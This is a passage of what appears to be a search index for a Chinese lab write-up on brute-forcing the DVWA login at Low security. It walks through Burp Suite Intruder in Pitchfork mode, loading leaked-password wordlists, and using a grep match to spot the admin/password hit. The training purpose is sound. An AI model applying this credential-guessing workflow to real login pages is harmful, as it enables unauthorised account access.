\u94fe\u63a5: https://pan.baidu.com/s/1NbOkmIbhBXOvejwSyoCF2A \u5bc6\u7801:74gz \u5728\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u662f xato-net-10-million-passwords-dup.txt \u548c xato-net-10-million-usernames-dup.txt \u4e24\u4efd\u57fa\u4e8e\u9891\u7387\u6392\u5e8f\u7684\u8bcd\u5178\u3002 \u5728 Payload \u754c\u9762\u901a\u8fc7 Load \u6309\u94ae\u5c06\u8bcd\u5178\u5f15\u5165\uff0c Payload set \u4e3a 1 \u65f6 \u5f15\u5165\u7684\u662f \u8d26\u53f7 \uff0c Payload set \u4e3a 2 \u65f6 \u5f15\u5165\u7684\u662f \u5bc6\u7801 \u3002 \\text{Figure 15. Payload} 3.4. \u8bbe\u7f6e\u5c97\u54e8 # \u586b\u88c5\u597d\u5f39\u836f\u4ee5\u540e\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u77e5\u9053\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u7834\u89e3\u7b97\u6210\u529f\u4e86\u3002\u6211\u4eec\u5148\u968f\u610f\u586b\u5199\u4e00\u6b21\u8d26\u53f7\u5bc6\u7801\uff0c\u53d1\u73b0\u5f53\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u65f6\uff0c\u9875\u9762\u4f1a\u663e\u793a Username and/or password incorrect. \u90a3\u4e48\u5f53\u9875\u9762\u6ca1\u6709\u663e\u793a\u8fd9\u6761\u4fe1\u606f\u65f6\uff0c\u8bf4\u660e\u6211\u4eec\u7834\u89e3\u6210\u529f\u4e86\u3002 \\text{Figure 16. Incorrect Page} \u6240\u4ee5\u6211\u4eec\u8981\u5728 Intruder - 2 - Option - Grep Match \u4e2d\u6dfb\u52a0 incorrect \u5173\u952e\u8bcd\uff0c\u5e76\u4e14\u52fe\u9009 Flag \u3002 \\text{Figure 17. Grep Match} 3.5. \u5f00\u59cb\u653b\u51fb # \u63a5\u4e0b\u6765\uff0c\u5728 Payload \u754c\u9762\u70b9\u51fb Start Attack \u5f00\u59cb\u653b\u51fb\u3002\u70b9\u51fb\u540e\u4f1a\u6709\u4e00\u4e2a\u63d0\u793a\u8bf4\u514d\u8d39\u7248\u7684\u653b\u51fb\u65f6\u957f\u53d7\u9650\uff0c\u70b9 OK \u5373\u53ef\u3002 \\text{Figure 18. Attack} \u5f88\u5feb\uff0c\u6211\u4eec\u5c31\u53d1\u73b0\u4e86\u6709\u4e00\u6761\u653b\u51fb\u8bf7\u6c42\u7684 Response \u4e2d\u6ca1\u6709 incorrect \u5173\u952e\u8bcd\u3002 \\text{Figure 19. Sign} \u67e5\u770b\u8be5\u6b21\u653b\u51fb\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u53d1\u73b0\u5176\u8d26\u53f7\u4e3a admin \uff0c\u5bc6\u7801\u4e3a password \u3002\u5230\u6b64\uff0c\u6211\u4eec\u5c31\u6210\u529f\u5730\u901a\u8fc7\u66b4\u529b\u65b9\u5f0f\u7834\u89e3\u4e86 DVWA Brute Force \u5b89\u5168\u7b49\u7ea7\u4e3a Low \u7684\u5bc6\u7801\u3002 \\text{Figure 20. Password} 4. \u53c2\u8003\u6587\u732e # [1] \u5f90\u7131, \u674e\u6587\u8f69, \u738b\u4e1c\u4e9a. Web \u5b89\u5168\u653b\u9632:\u6e17\u900f\u6d4b\u8bd5\u5b9e\u6218\u6307\u5357 [M]. \u5317\u4eac: \u7535\u5b50\u5de5\u4e1a\u51fa\u7248\u793e, 2018. \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.DVWA Brute Force Low"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#dvwa-brute-force-low","text":"","title":"DVWA Brute Force Low"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#_1","text":"DVWA Brute Force Low \u76ee\u5f55 1. \u80cc\u666f 2. \u51c6\u5907\u5de5\u4f5c 2.1. \u9776\u573a\u73af\u5883 2.2. \u5b89\u88c5\u7834\u89e3\u5de5\u5177 3. \u7834\u89e3\u8fc7\u7a0b 3.1. \u4ee3\u7406\u8bf7\u6c42 3.2. \u62e6\u622a\u8bf7\u6c42 3.3. \u586b\u88c5\u5f39\u836f 3.4. \u8bbe\u7f6e\u5c97\u54e8 3.5. \u5f00\u59cb\u653b\u51fb 4. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#1","text":"\u6700\u8fd1\u53c2\u52a0\u4e86 2020\u817e\u8baf\u5b89\u5168\u5e73\u53f0\u90e8\u6781\u5ba2\u6280\u672f\u6311\u6218\u8d5b \uff0c\u83b7\u5f97\u4e86\u4e00\u6b21\u817e\u8baf\u7eff\u8272\u901a\u9053\u9762\u8bd5\u7684\u673a\u4f1a\uff0c\u56e0\u6b64\u6211\u60f3\u8981\u501f\u6b64\u673a\u4f1a\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u66b4\u529b\u7834\u89e3\u5b89\u5168\u7b49\u7ea7\u4e3a Low \u7684\u8d26\u53f7\u5bc6\u7801\u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#2","text":"","title":"2. \u51c6\u5907\u5de5\u4f5c"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#21","text":"\u9996\u5148\u914d\u7f6e\u9776\u573a\u73af\u5883\uff0c\u5982\u679c\u60f3\u8981\u5728\u672c\u5730\u914d\u7f6e\u9776\u573a\u73af\u5883\uff0c\u53ef\u4ee5\u53c2\u8003 github\u4e0a\u7684\u6559\u7a0b \uff0c\u8fd9\u91cc\u63a8\u8350\u5927\u5bb6\u76f4\u63a5\u4f7f\u7528 vulnspy \u63d0\u4f9b\u7684 \u5728\u7ebf\u7684\u9776\u573a\u73af\u5883 \u3002 \u5982\u56fe1\u6240\u793a\uff0c\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684 Start To Hack \u4f7f\u7528GitHub\u8d26\u53f7\u767b\u9646\uff0c\u5373\u53ef\u521b\u5efa\u9776\u573a\u73af\u5883\u3002 \\text{Figure 1. \u521b\u5efa\u9776\u573a\u73af\u5883} \u521b\u5efa\u73af\u5883\u4ee5\u540e\uff0c\u5728 LABS \u6807\u7b7e\u4e0b\uff0c\u70b9\u51fb Target Address \u4e0b\u7684\u94fe\u63a5\u5373\u53ef\u8fdb\u5165\u73af\u5883\uff0c\u4e00\u6b21\u521b\u5efa\u6709\u6548\u671f\u4e3a 2 \u4e2a\u5c0f\u65f6\uff0c\u7ed3\u675f\u540e\u53ef\u4ee5\u518d\u6b21\u521b\u5efa\uff0c\u6700\u591a\u80fd\u591f\u540c\u65f6\u521b\u5efa 5 \u4e2a\u5b9e\u9a8c\u73af\u5883\u3002 \\text{Figure 2. \u8fdb\u5165\u9776\u573a\u73af\u5883} \u8fdb\u5165\u9875\u9762\u4ee5\u540e\uff0c\u8d26\u53f7\u5bc6\u7801\u90fd\u662f\u9ed8\u8ba4\u7684\uff0c\u70b9\u51fb\u767b\u9646\u3002 \\text{Figure 3. \u767b\u9646} \u62c9\u5230\u9875\u9762\u5e95\u90e8\uff0c\u70b9\u51fb\u521b\u5efa\u6570\u636e\u5e93\u3002 \\text{Figure 4. \u521b\u5efa\u6570\u636e\u5e93} \u521b\u5efa\u5b8c\u6210\u540e\uff0c\u4f1a\u56de\u5230\u767b\u9646\u9875\u9762\u8981\u6c42\u91cd\u65b0\u767b\u9646\uff0c\u518d\u6b21\u767b\u9646\u5373\u53ef\u3002 \u9ed8\u8ba4\u7684\u96be\u5ea6\u662f impossible \uff0c\u57fa\u672c\u6ca1\u6709\u5b89\u5168\u6f0f\u6d1e\uff0c\u6211\u4eec\u8981\u70b9\u51fb\u5de6\u8fb9\u7684 DVWA Security \u8bbe\u7f6e\u96be\u5ea6\u3002 \\text{Figure 5. \u8fdb\u5165\u8bbe\u7f6e\u96be\u5ea6\u9875\u9762} \u9875\u9762\u4e0a\u4e5f\u6709\u76f8\u5e94\u7684\u96be\u5ea6\u8bf4\u660e\uff0c\u6211\u4eec\u5148\u4ece Low \u7684\u96be\u5ea6\u5f00\u59cb\u8bad\u7ec3\u3002 \\text{Figure 6. \u8bbe\u7f6e\u96be\u5ea6\u4e3aLow} \u70b9\u51fb\u5de6\u8fb9\u7684 Brute Force \u6807\u7b7e\uff0c\u6211\u4eec\u5c31\u8fdb\u5165\u5230\u5bc6\u7801\u7834\u89e3\u7684\u8bad\u7ec3\u9875\u9762\u4e86\u3002 \\text{Figure 7. Brute Force}","title":"2.1. \u9776\u573a\u73af\u5883"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#22","text":"\u4e0b\u8f7d Burp Suite Community \u514d\u8d39\u7248\u672c \uff0c\u56fe\u5f62\u754c\u9762\u5b89\u88c5\u3002\u4e0b\u8f7d\u6709\u70b9\u6162\uff0c Mac \u7cfb\u7edf\u7684\u540c\u5b66\u53ef\u4ee5\u4ece\u767e\u5ea6\u7f51\u76d8\u4e0b\u8f7d\u3002 \u94fe\u63a5: https://pan.baidu.com/s/1fXM7uKv2lE5KoEDgCVnazQ \u5bc6\u7801:x7sj \u5b89\u88c5\u5b8c\u6210\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u6211\u4eec\u7684\u7834\u89e3\u4e86\u3002","title":"2.2. \u5b89\u88c5\u7834\u89e3\u5de5\u5177"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#3","text":"","title":"3. \u7834\u89e3\u8fc7\u7a0b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#31","text":"\u9996\u5148\u8bbe\u7f6e\u6d4f\u89c8\u5668\u7684\u4ee3\u7406\uff0c\u5728 Safari \u4e2d\u64cd\u4f5c\u8def\u5f84\u4e3a\u4e3a \u504f\u597d\u8bbe\u7f6e - \u9ad8\u7ea7 - \u4ee3\u7406 - \u66f4\u6539\u8bbe\u7f6e \uff0c\u8bbe\u7f6eHTTP\u4ee3\u7406\uff0c\u5c06\u4ee3\u7406\u670d\u52a1\u5668\u5730\u5740\u8bbe\u7f6e\u4e3a 127.0.0.1:8000 \u3002 \\text{Figure 8. \u4ee3\u7406} \u4e0e Proxy - Option \u4e2d\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\u3002 \\text{Figure 9. Proxy - Option} \u6211\u4eec\u518d\u5bf9 Burp Proxy \u8fdb\u884c\u4e00\u4e9b\u4e86\u89e3\u3002\u5185\u5bb9\u53c2\u8003\u81ea \u300aWeb\u5b89\u5168\u653b\u9632\uff1a\u6e17\u900f\u6d4b\u8bd5\u5b9e\u6218\u6307\u5357\u300b \u4e2d\u5bf9 Burp Proxy \u7684\u4ecb\u7ecd\u3002 Burp Proxy \u662f\u5229\u7528 Burp \u5f00\u5c55\u6d4b\u8bd5\u6d41\u7a0b\u7684\u6838\u5fc3\uff0c\u901a\u8fc7\u4ee3\u7406\u6a21\u5f0f\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u62e6\u622a\u3001\u67e5\u770b\u3001\u4fee\u6539\u6240\u6709\u5728\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u4f20\u8f93\u7684\u6570\u636e\u3002 Burp Proxy \u7684\u62e6\u622a\u529f\u80fd\u4e3b\u8981\u7531 Intercept \u9009\u9879\u5361\u4e2d\u7684 Forward\u3001Drop\u3001Interception is on/off\u548cAction \u6784\u6210\uff0c\u5b83\u4eec\u7684\u529f\u80fd\u5982\u4e0b\u6240\u793a\u3002 Forward \u8868\u793a\u5c06\u62e6\u622a\u7684\u6570\u636e\u5305\u6216\u4fee\u6539\u540e\u7684\u6570\u636e\u5305\u53d1\u9001\u81f3\u670d\u52a1\u5668\u7aef\u3002 Drop \u8868\u793a\u4e22\u5f03\u5f53\u524d\u62e6\u622a\u7684\u6570\u636e\u5305\u3002 Interception is on \u8868\u793a\u5f00\u542f\u62e6\u622a\u529f\u80fd\uff0c\u5355\u51fb\u540e\u53d8\u4e3a Interception is off \uff0c\u8868\u793a\u5173\u95ed\u62e6\u622a\u529f\u80fd\u3002 \u5355\u51fb Action \u6309\u94ae\uff0c\u53ef\u4ee5\u5c06\u6570\u636e\u5305\u8fdb\u4e00\u6b65\u53d1\u9001\u5230 Spider\u3001Scanner\u3001Repeater\u3001Intruder \u7b49\u529f\u80fd\u7ec4\u4ef6\u505a\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5\uff0c\u540c\u65f6\u4e5f\u5305\u542b\u6539\u53d8\u6570\u636e\u5305\u8bf7\u6c42\u65b9\u5f0f\u53ca\u5176body\u7684\u7f16\u7801\u7b49\u529f\u80fd\u3002 \u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u9700\u8981\u8bbf\u95ee\u7684 URL \u5e76\u6309\u56de\u8f66\u952e\uff0c\u8fd9\u65f6\u5c06\u770b\u5230\u6570\u636e\u6d41\u91cf\u7ecf\u8fc7 Burp Proxy \u5e76\u6682\u505c\uff0c\u76f4\u5230\u5355\u51fb Forward \u6309\u94ae\uff0c\u624d\u4f1a\u7ee7\u7eed\u4f20\u8f93\u4e0b\u53bb\u3002\u5982\u679c\u5355\u51fb\u4e86 Drop \u6309\u94ae\uff0c\u8fd9\u6b21\u901a\u8fc7\u7684\u6570\u636e\u5c06\u4e22\u5931\uff0c\u4e0d\u518d\u7ee7\u7eed\u5904\u7406\u3002 \u5f53 Burp Suite \u62e6\u622a\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4ea4\u4e92\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 Burp Suite \u7684\u6d88\u606f\u5206\u6790\u9009\u9879\u4e2d\u67e5\u770b\u8fd9\u6b21\u8bf7\u6c42\u7684\u5b9e\u4f53\u5185\u5bb9\u3001\u6d88\u606f\u5934\u3001\u8bf7\u6c42\u53c2\u6570\u7b49\u4fe1\u606f\u3002 Burp \u6709\u56db\u79cd\u6d88\u606f\u7c7b\u578b\u663e\u793a\u6570\u636e\u5305\uff1a Raw\u3001Params\u3001Headers \u548c Hex \u3002 Raw \u4e3b\u8981\u663e\u793a Web \u8bf7\u6c42\u7684 raw \u683c\u5f0f\uff0c\u4ee5\u7eaf\u6587\u672c\u7684\u5f62\u5f0f\u663e\u793a\u6570\u636e\u5305\uff0c\u5305\u542b\u8bf7\u6c42\u5730\u5740\u3001 HTTP \u534f\u8bae\u7248\u672c\u3001\u4e3b\u673a\u5934\u3001\u6d4f\u89c8\u5668\u4fe1\u606f\u3001 Accept \u53ef\u63a5\u53d7\u7684\u5185\u5bb9\u7c7b\u578b\u3001\u5b57\u7b26\u96c6\u3001\u7f16\u7801\u65b9\u5f0f\u3001 cookie \u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u4fee\u6539\u8fd9\u4e9b\u4fe1\u606f\uff0c\u5bf9\u670d\u52a1\u5668\u7aef\u8fdb\u884c\u6e17\u900f\u6d4b\u8bd5\u3002 Params \u4e3b\u8981\u663e\u793a\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u53c2\u6570\u4fe1\u606f\uff0c\u5305\u62ecGET\u6216\u8005POST\u8bf7\u6c42\u7684\u53c2\u6570\u3001 cookie \u53c2\u6570\u3002\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd9\u4e9b\u8bf7\u6c42\u53c2\u6570\u5b8c\u6210\u5bf9\u670d\u52a1\u5668\u7aef\u7684\u6e17\u900f\u6d4b\u8bd5\u3002 Headers \u4e2d\u663e\u793a\u7684\u662f\u6570\u636e\u5305\u4e2d\u7684\u5934\u4fe1\u606f\uff0c\u4ee5\u540d\u79f0\u3001\u503c\u7684\u5f62\u5f0f\u663e\u793a\u6570\u636e\u5305\u3002 Hex \u5bf9\u5e94\u7684\u662fRaw\u4e2d\u4fe1\u606f\u7684\u4e8c\u8fdb\u5236\u5185\u5bb9\uff0c\u53ef\u4ee5\u901a\u8fc7Hex\u7f16\u8f91\u5668\u5bf9\u8bf7\u6c42\u7684\u5185\u5bb9\u8fdb\u884c\u4fee\u6539\uff0c\u5728\u8fdb\u884c00\u622a\u65ad\u65f6\u975e\u5e38\u597d\u7528\u3002 1","title":"3.1. \u4ee3\u7406\u8bf7\u6c42"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#32","text":"\u63a5\u4e0b\u6765\u6211\u4eec\u8981\u5f00\u59cb\u62e6\u622a\u8bf7\u6c42\uff0c\u5728 Burp Suite \u70b9\u51fb Intercept is off \u4e2d\u6253\u5f00\u8bf7\u6c42\u62e6\u622a\u3002 \\text{Figure 10. \u8bf7\u6c42\u62e6\u622a} \u5728\u9776\u573a\u7684 Brute Force \u9875\u9762\u4e2d\u8f93\u5165\u4efb\u610f\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u70b9\u51fb\u767b\u9646\u3002\u5728 Burp Suite \u7684 Proxy - Intecept \u754c\u9762\u4e2d\u663e\u793a\u62e6\u622a\u6210\u529f\uff0c\u70b9\u51fb Intercept is on \u5173\u95ed\u62e6\u622a\u3002 \\text{Figure 11. \u62e6\u622a\u6210\u529f} \u5728Http History\u4e2d\u627e\u5230\u5e26\u8d26\u53f7\u5bc6\u7801\u7684\u8bf7\u6c42\u3002 \\text{Figure 12. Http History} \u5168\u9009\u540e\uff0c\u53f3\u952e\u9009\u62e9 Send To Intruder \u3002 \\text{Figure 13. Send To Intruder} \u5728 Intruder - 2 - Position \u754c\u9762\u4e2d\uff0c\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u4ee5\u5916\u7684\u53d8\u91cf\u53bb\u9664\uff0c\u9009\u62e9 Attack type \u4e3a Pitchfork \u3002 \\text{Figure 14. Intruder} \u5404\u79cd\u6a21\u5f0f\u7684\u533a\u522b\u53ef\u4ee5\u53c2\u8003 \u300aWeb\u5b89\u5168\u653b\u9632\uff1a\u6e17\u900f\u6d4b\u8bd5\u5b9e\u6218\u6307\u5357\u300b \u4e2d\u7684\u5185\u5bb9\uff0c\u5177\u4f53\u5982\u4e0b\u3002 Sniper \u6a21\u5f0f\u4f7f\u7528 \u5355\u4e00 \u7684 Payload \u7ec4\u3002\u5b83\u4f1a\u9488\u5bf9\u6bcf\u4e2a\u4f4d\u7f6e\u8bbe\u7f6e Payload \u3002\u8fd9\u79cd\u653b\u51fb\u7c7b\u578b\u9002\u7528\u4e8e\u5bf9\u5e38\u89c1\u6f0f\u6d1e\u4e2d\u7684\u8bf7\u6c42\u53c2\u6570\u5355\u72ec\u8fdb\u884c Fuzzing \u6d4b\u8bd5\u7684\u60c5\u666f\u3002\u653b\u51fb\u4e2d\u7684\u8bf7\u6c42\u603b\u6570\u5e94\u8be5\u662f position \u6570\u91cf\u548c Payload \u6570\u91cf\u7684\u4e58\u79ef\u3002 Battering ram \u6a21\u5f0f\u4f7f\u7528 \u5355\u4e00 \u7684 Payload \u7ec4\u3002\u5b83\u4f1a\u91cd\u590d Payload \u5e76\u4e00\u6b21\u6027\u628a\u6240\u6709\u76f8\u540c\u7684 Payload \u653e\u5165\u6307\u5b9a\u7684\u4f4d\u7f6e\u4e2d\u3002\u8fd9\u79cd\u653b\u51fb\u9002\u7528\u4e8e\u9700\u8981\u5728\u8bf7\u6c42\u4e2d\u628a\u76f8\u540c\u7684\u8f93\u5165\u653e\u5230\u591a\u4e2a\u4f4d\u7f6e\u7684\u60c5\u666f\u3002\u8bf7\u6c42\u7684\u603b\u6570\u662f Payload \u7ec4\u4e2d Payload \u7684\u603b\u6570\u3002 Pitchfork \u6a21\u5f0f\u4f7f\u7528 \u591a\u4e2a Payload \u7ec4\u3002\u653b\u51fb\u4f1a\u540c\u6b65\u8fed\u4ee3\u6240\u6709\u7684 Payload \u7ec4\uff0c\u628a Payload \u653e\u5165\u6bcf\u4e2a\u5b9a\u4e49\u7684\u4f4d\u7f6e\u4e2d\u3002\u8fd9\u79cd\u653b\u51fb\u7c7b\u578b\u975e\u5e38\u9002\u5408\u5728\u4e0d\u540c\u4f4d\u7f6e\u4e2d\u9700\u8981\u63d2\u5165\u4e0d\u540c\u4f46\u76f8\u4f3c\u8f93\u5165\u7684\u60c5\u51b5\u3002\u8bf7\u6c42\u7684\u6570\u91cf\u5e94\u8be5\u662f\u6700\u5c0f\u7684 Payload \u7ec4\u4e2d\u7684 Payload \u6570\u91cf\u3002 Cluster bomb \u6a21\u5f0f\u4f1a\u4f7f\u7528 \u591a\u4e2a Payload \u7ec4\u3002\u6bcf\u4e2a\u5b9a\u4e49\u7684\u4f4d\u7f6e\u4e2d\u6709\u4e0d\u540c\u7684 Payload \u7ec4\u3002\u653b\u51fb\u4f1a\u8fed\u4ee3\u6bcf\u4e2a Payload \u7ec4\uff0c\u6bcf\u79cd Payload \u7ec4\u5408\u90fd\u4f1a\u88ab\u6d4b\u8bd5\u4e00\u904d\u3002\u8fd9\u79cd\u653b\u51fb\u9002\u7528\u4e8e\u5728\u4f4d\u7f6e\u4e2d\u9700\u8981\u4e0d\u540c\u4e14\u4e0d\u76f8\u5173\u6216\u8005\u672a\u77e5\u8f93\u5165\u653b\u51fb\u7684\u60c5\u666f\u3002\u653b\u51fb\u8bf7\u6c42\u7684\u603b\u6570\u662f\u5404 Payload \u7ec4\u4e2d Payload \u6570\u91cf\u7684\u4e58\u79ef\u3002 1","title":"3.2. \u62e6\u622a\u8bf7\u6c42"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#33","text":"\u8981\u901a\u8fc7\u66b4\u529b\u6765\u7834\u89e3\u5bc6\u7801\uff0c\u904d\u5386\u6240\u6709\u7b26\u53f7\u7684\u6392\u5217\u7ec4\u5408\u662f\u6bd4\u8f83\u4f4e\u6548\u7684\uff0c\u56e0\u4e3a\u6bcf\u79cd\u60c5\u51b5\u5e76\u975e\u7b49\u53ef\u80fd\u5730\u51fa\u73b0\uff0c\u4eba\u4eec\u4e3a\u4e86\u8981\u8bb0\u5fc6\u81ea\u5df1\u7684\u5bc6\u7801\uff0c\u4e00\u822c\u90fd\u4f1a\u9075\u5faa\u67d0\u4e9b\u89c4\u5f8b\uff0c\u6bd4\u5982\u5728\u5bc6\u7801\u4e2d\u5305\u542b\u59d3\u540d\u3001\u751f\u65e5\u7b49\u7b49\u5b57\u6bb5\u3002\u6240\u4ee5\u6211\u4eec\u5c31\u9700\u8981\u4e00\u4efd\u5305\u542b\u9ad8\u9891\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u8bcd\u5178\u4f5c\u4e3a\u5f39\u836f\uff0c\u4ece\u800c\u5bf9\u7cfb\u7edf\u8fdb\u884c\u8f70\u70b8\u3002 \u6211\u9009\u62e9\u7684\u662f Github\u4e0a\u7684SecLists\u9879\u76ee \uff0c\u4e0a\u9762\u6709\u8bb8\u591a\u5728\u6697\u7f51\u6216\u8005\u5176\u4ed6\u6e20\u9053\u6cc4\u9732\u51fa\u6765\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6709\u4e9b\u6309\u7167\u9891\u7387\u8fdb\u884c\u4e86\u6392\u5e8f\uff0c\u66f4\u52a0\u65b9\u4fbf\u6211\u4eec\u4f7f\u7528\u3002 \u6211\u4e5f\u9009\u4e86\u4e00\u4e9b\u653e\u5728\u4e86\u767e\u5ea6\u7f51\u76d8\u4e0a\u3002 \u94fe\u63a5: https://pan.baidu.com/s/1NbOkmIbhBXOvejwSyoCF2A \u5bc6\u7801:74gz \u5728\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u662f xato-net-10-million-passwords-dup.txt \u548c xato-net-10-million-usernames-dup.txt \u4e24\u4efd\u57fa\u4e8e\u9891\u7387\u6392\u5e8f\u7684\u8bcd\u5178\u3002 \u5728 Payload \u754c\u9762\u901a\u8fc7 Load \u6309\u94ae\u5c06\u8bcd\u5178\u5f15\u5165\uff0c Payload set \u4e3a 1 \u65f6 \u5f15\u5165\u7684\u662f \u8d26\u53f7 \uff0c Payload set \u4e3a 2 \u65f6 \u5f15\u5165\u7684\u662f \u5bc6\u7801 \u3002 \\text{Figure 15. Payload}","title":"3.3. \u586b\u88c5\u5f39\u836f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#34","text":"\u586b\u88c5\u597d\u5f39\u836f\u4ee5\u540e\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u77e5\u9053\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u7834\u89e3\u7b97\u6210\u529f\u4e86\u3002\u6211\u4eec\u5148\u968f\u610f\u586b\u5199\u4e00\u6b21\u8d26\u53f7\u5bc6\u7801\uff0c\u53d1\u73b0\u5f53\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u65f6\uff0c\u9875\u9762\u4f1a\u663e\u793a Username and/or password incorrect. \u90a3\u4e48\u5f53\u9875\u9762\u6ca1\u6709\u663e\u793a\u8fd9\u6761\u4fe1\u606f\u65f6\uff0c\u8bf4\u660e\u6211\u4eec\u7834\u89e3\u6210\u529f\u4e86\u3002 \\text{Figure 16. Incorrect Page} \u6240\u4ee5\u6211\u4eec\u8981\u5728 Intruder - 2 - Option - Grep Match \u4e2d\u6dfb\u52a0 incorrect \u5173\u952e\u8bcd\uff0c\u5e76\u4e14\u52fe\u9009 Flag \u3002 \\text{Figure 17. Grep Match}","title":"3.4. \u8bbe\u7f6e\u5c97\u54e8"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#35","text":"\u63a5\u4e0b\u6765\uff0c\u5728 Payload \u754c\u9762\u70b9\u51fb Start Attack \u5f00\u59cb\u653b\u51fb\u3002\u70b9\u51fb\u540e\u4f1a\u6709\u4e00\u4e2a\u63d0\u793a\u8bf4\u514d\u8d39\u7248\u7684\u653b\u51fb\u65f6\u957f\u53d7\u9650\uff0c\u70b9 OK \u5373\u53ef\u3002 \\text{Figure 18. Attack} \u5f88\u5feb\uff0c\u6211\u4eec\u5c31\u53d1\u73b0\u4e86\u6709\u4e00\u6761\u653b\u51fb\u8bf7\u6c42\u7684 Response \u4e2d\u6ca1\u6709 incorrect \u5173\u952e\u8bcd\u3002 \\text{Figure 19. Sign} \u67e5\u770b\u8be5\u6b21\u653b\u51fb\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u53d1\u73b0\u5176\u8d26\u53f7\u4e3a admin \uff0c\u5bc6\u7801\u4e3a password 